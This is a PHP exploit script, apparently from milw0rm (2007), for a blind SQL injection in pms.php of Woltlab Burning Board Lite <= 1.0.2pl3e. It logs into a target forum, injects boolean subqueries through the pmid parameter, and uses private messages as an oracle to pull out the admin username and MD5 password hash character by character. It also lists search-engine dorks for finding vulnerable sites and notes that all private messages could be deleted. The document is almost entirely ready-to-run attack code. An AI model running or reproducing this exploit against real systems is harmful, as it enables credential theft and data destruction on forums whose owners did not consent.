<?php
print_r('
-------------------------------------------------------------------------------
Woltlab Burning Board Lite <= 1.0.2pl3e pms.php / sql injection exploit
by rgod
mail: retrog at alice dot it
site: http://retrogod.altervista.org

dork: "Powered by Burning Board" -exploit -dork -johnny
version specific:
"Powered by Burning Board Lite 1.0.2" "2001-2004 WoltLab GmbH"
-------------------------------------------------------------------------------
');
/*
works regardless of php.ini settings
against MySQL >= 4.1
*/
if ($argc<6) {
print_r('
-------------------------------------------------------------------------------
Usage: php '.$argv[0].' host path user pass action OPTIONS
host:      target server (ip/hostname)
path:      path to wbblite
user/pass: valid user credentials
action:    1 vulnerability check
           2 disclose admin credentials
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]:    "    a proxy
Example:
php '.$argv[0].' localhost /wbblite/ rgod pass 1 -P1.1.1.1:80
php '.$argv[0].' localhost /wbblite/ rgod pass 2 ls -la -p81
-------------------------------------------------------------------------------
');
die;
}

/*
short explaination:

pms.php, near lines 140-160, sql injection in $_POST['pmid'] argument:

...
if(isset($_POST['action']) && $_POST['action']=="delmark") {
 if($_POST['pmid'] && count($_POST['pmid'])) $pmids=implode(',',$_POST['pmid']);
 else $pmids="";
 if($pmids) {
  if($_POST['folderid']=="outbox") {
   $db->query("DELETE FROM bb".$n."_privatemessage WHERE senderid='$wbbuserdata[userid]' AND deletepm=1 AND privatemessageid IN (".addslashes($pmids).")");
   $db->unbuffered_query("UPDATE bb".$n."_privatemessage SET deletepm=2 WHERE senderid='$wbbuserdata[userid]' AND privatemessageid IN (".addslashes($pmids).")",1);
  }
  else {
   $db->query("DELETE FROM bb".$n."_privatemessage WHERE recipientid='$wbbuserdata[userid]' AND deletepm=2 AND privatemessageid IN (".addslashes($pmids).")");
   $db->unbuffered_query("UPDATE bb".$n."_privatemessage SET deletepm=1 WHERE recipientid='$wbbuserdata[userid]' AND privatemessageid IN (".addslashes($pmids).")",1);
  }
 }
 header("Location: pms.php?folderid=$folderid&sid=$session[hash]");
 exit();
}
...

we have an addslashes() but no quotes...

you can ask true/false questions to the database by deleting / sending private messages to yourself...

this one discloses the admin username/md5 hash pair

note : if working, this one will preserve private messages with a subject other than 'sun-tzu'
but... modifying queries an attacker can easily delete all forum private messages
*/

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$user=$argv[3];
$pass=$argv[4];
$action=(int)$argv[5];
$port=80;
$proxy="";
for ($i=5; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
if (($action!=1) and ($action!=2)) {echo "wrong action...";}

$data   ="l_username=$user&l_password=$pass&send=send";
$packet ="POST ".$p."login.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="User-Agent: Lynx/2.8.3dev.8 libwww-FM/2.14FM\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Accept: text/plain\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$cookie="";
for ($i=1; $i<count($temp); $i++)
{
  $temp2=explode(" ",$temp[$i]);
  $cookie.=" ".trim($temp2[0]);
  if ($cookie[strlen($cookie)-1]!=";"){$cookie.=";";}
}
if ((!eregi("userpassword",$cookie)) | (!eregi("userid",$cookie)))
{die("failed to login...you need valid user credentials to to do this...");}
else {
  //echo "cookie -> ".$cookie."\n\n";
}

$temp=explode("index.php?sid=",$html);
$temp2=explode("\"",$temp[1]);
$sid=trim($temp2[0]);
//echo "sid -> ".$sid."\n\n";

if ($action==1)
{
$sql="suntzu/*";
$sql=urlencode($sql);
$data ="action=delmark";
$data.="&pmid[0]=$sql";
$data.="&folderid=outbox";
$packet ="POST ".$p."pms.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (!eregi("You have an error in your SQL syntax",$html))
{
  die("not vulnerable...\n");
}
else
{
  echo "vulnerable...\n";
}
}
elseif ($action==2)
{
function send_pm()
{
    global $user,$sid,$p,$host,$cookie;
    $data ="recipient=$user";
    $data.="&subject=sun-tzu";
    $data.="&iconid=0";
    $data.="&mode=0";
    $data.="&message=suntzoi";
    $data.="&parseurl=1";
    $data.="&showsignature=1";
    $data.="&savecopy=1";
    $data.="&pmid=";
    $data.="&send=send";
    $data.="&action=newpm";
    $data.="&sid=$sid";
    $data.="&submit=Send+Message";
    $packet ="POST ".$p."pms.php HTTP/1.0\r\n";
    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
    $packet.="Host: ".$host."\r\n";
    $packet.="User-Agent: Lynx/2.8.3dev.8 libwww-FM/2.14FM\r\n";
    $packet.="Content-Length: ".strlen($data)."\r\n";
    $packet.="Cookie: ".$cookie."\r\n";
    $packet.="Connection: Close\r\n\r\n";
    $packet.=$data;
    sendpacketii($packet);

}

function check_pm()
{ global $p,$host,$cookie,$html;
  $packet ="GET ".$p."pms.php HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="User-Agent: Lynx/2.8.3dev.8 libwww-FM/2.14FM\r\n";
  $packet.="Cookie: ".$cookie."\r\n";
  $packet.="Connection: Close\r\n\r\n";
  sendpacketii($packet);
  if (eregi("sun-tzu",$html)){return true;}
  else {return false;}
}

function my_encode($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}

send_pm();
$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers
$chars=array_merge($chars,range(97,102));//a-f letters
$j=1;$password="";
echo "md5 hash   -> ";
while (!strstr($password,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
        if (in_array($i,$chars))
        {
            //original query;
		    //DELETE FROM bb1_privatemessage WHERE senderid='1' AND deletepm=1 AND privatemesageid IN ([injection here])
            $sql="9999999)/**/OR/**/1=(SELECT/**/(IF((ASCII(SUBSTRING(password,".$j.",1))=".$i."),1,0))/**/FROM/**/bb1_users/**/LIMIT/**/1)/**/AND/**/subject=".my_encode("sun-tzu")."/*";
            $sql=urlencode($sql);
            $data ="action=delmark";
            $data.="&pmid[0]=$sql";
            $data.="&folderid=outbox";
            $packet ="POST ".$p."pms.php HTTP/1.0\r\n";
            $packet.="Host: ".$host."\r\n";
            $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
            $packet.="Content-Length: ".strlen($data)."\r\n";
            $packet.="Cookie: ".$cookie."\r\n";
            $packet.="Connection: Close\r\n\r\n";
            $packet.=$data;
            sendpacketii($packet);
            if (eregi("You have an error in your SQL syntax",$html)){echo $html; die("\nunknown query error or wrong MySQL version...");}
            sleep(1);
            if (!check_pm()) {$password.=chr($i);echo chr($i);send_pm();break;}

        }
        if ($i==255) {
            die("\nExploit failed...");
        }
    }
$j++;
}
echo "\n";

$j=1;$admin="";
echo "admin user -> ";
while (!strstr($admin,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
            $sql="9999999)/**/OR/**/1=(SELECT/**/(IF((ASCII(SUBSTRING(username,".$j.",1))=".$i."),1,0))/**/FROM/**/bb1_users/**/LIMIT/**/1)/**/AND/**/subject=".my_encode("sun-tzu")."/*";
            $sql=urlencode($sql);
            $data ="action=delmark";
            $data.="&pmid[0]=$sql";
            $data.="&folderid=outbox";
            $packet ="POST ".$p."pms.php HTTP/1.0\r\n";
            $packet.="Host: ".$host."\r\n";
            $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
            $packet.="Content-Length: ".strlen($data)."\r\n";
            $packet.="Cookie: ".$cookie."\r\n";
            $packet.="Connection: Close\r\n\r\n";
            $packet.=$data;
            sendpacketii($packet);
            sleep(1);
            if (!check_pm()) {$admin.=chr($i);echo chr($i);send_pm();break;}
            if ($i==255) {die("\nExploit failed...");
        }
    }
$j++;
}
echo "\n";
}
?>

# milw0rm.com [2007-02-03]